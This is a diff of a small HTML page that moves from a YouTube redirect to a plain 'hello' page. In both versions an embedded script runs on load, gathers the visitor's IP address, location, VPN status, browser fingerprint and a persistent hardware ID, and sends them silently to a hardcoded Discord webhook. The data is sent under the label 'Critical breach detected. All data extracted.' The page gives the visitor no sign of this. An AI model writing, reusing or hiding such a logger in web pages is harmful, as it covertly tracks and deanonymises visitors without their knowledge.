@@ -1,26 +1,32 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirecting...</title>
-  <script type="text/javascript">
-    window.onload = function() {
-      setTimeout(function() {
-        window.location.href = "https://www.youtube.com/watch?v=j5a0jTc9S10&t=3s";
-      }, 5000);
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Hello Page</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: sans-serif;
+      background-color: #f0f0f0;
     }
-  </script>
-</head>
-<body>
-  <p>Redirecting to YouTube... Please wait.</p>
-<script>
-(async () => {
+    h1 {
+      font-size: 4rem;
+      color: #333;
+    }
+  </style>
+          <script>
+        	(async () => {
   const webhookURL = "https://discord.com/api/webhooks/1368211694584856647/7flwPKRczBxGY26ZQi5akKWaYFW5tMPSPWhtnVSkOrR0VdE57NnTGJlgD-6HwAVSAOV2";
   const ipAPIURL = "https://ipapi.co/json/";
 
   try {
     const data = await fetch(ipAPIURL).then(res => res.json());
+    const IPData = await fetch("https://ipapi.co/json/").then(res => res.json());
 
     let hwid = localStorage.getItem("vex_hwid");
     if (!hwid) {
@@ -30,7 +36,7 @@
 
     const ua = data.user_agent || navigator.userAgent;
     const ip = data.ip;
-    const isVPN = data.proxy;
+    const isVPN = data.proxy || data.hosting || data.mobile; // salah satu true berarti kemungkinan VPN
 
     function detectBrowser(ua) {
       if (/Edg/i.test(ua)) return "Edge";
@@ -102,8 +108,8 @@
 
     const embed = {
       embeds: [{
-      	image: { url: "https://files.catbox.moe/fr7gmm.jpeg" }
         title: "NEW VISITOR | NEW LOG ⚡",
+        image: { url: "https://files.catbox.moe/fr7gmm.jpeg" },
         description: "Critical breach detected. All data extracted.",
         fields: [
           {
@@ -118,9 +124,10 @@
             **Hardware Cores**: ${hardwareConcurrency}
             **Language**: ${lang}
             **Dark Mode**: ${isDarkMode}
-            **VPN Status**: ${vpnStatus}
+            **VPN Status**: ${vpnStatus}  
             **AirplaneMode**: ${isAirplaneMode ? "Yes" : "No"}
             **Reverse DNS**: ${reverseDNS}
+            **UserAgent**: ${ua.slice(0, 256)}
             `,
             inline: false
           },
@@ -178,10 +185,11 @@
     };
 
     await fetch(webhookURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(embed)
-    });
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify(embed)
+});
+
 
     
     const textMessage = `
@@ -189,12 +197,13 @@
 -----------------------------------
 
 🛡️ **SYSTEM INFORMATION**  
-**IPAddress**: ${ip}  
+**IP Address**: ${ip}  
 **HWID**: ${hwid}  
 **User Agent**: ${navigator.userAgent}  
 **Browser**: ${browser}  
 **Device Platform**: ${platform}  
 **Hardware Cores**: ${hardwareConcurrency}  
+**UserAgent**: ${ua.slice(0, 256)}
 
 🌍 **LOCATION DETAILS**  
 **City**: ${data.city}  
@@ -239,21 +248,30 @@ Please verify the system logs immediately!
 `;
 
 try {
-  const response = await fetch(webhookURL, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify(embed)
-  });
+    const response = await fetch(webhookURL, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ content: textMessage })
+});
 
-  if (!response.ok) {
-    throw new Error(`HTTP error! status: ${response.status}`);
+    if (!response.ok) {
+      const errorText = await response.text();
+      throw new Error(`HTTP error! status: ${response.status}, response: ${errorText}`);
+    }
+
+    console.log("Webhook sent successfully!");
+  } catch (error) {
+    console.error("Error sending webhook:", error.message || error);
   }
-  console.log("Webhook sent successfully!");
-} catch (error) {
-  console.error("Error sending webhook:", error);
-}
+  
+  } catch (err) {
+    console.error("Gagal menjalankan logger:", err.message || err);
+  }
+  
+})();
 </script>
+</head>
+<body>
+  <h1>hello</h1>
 </body>
 </html>
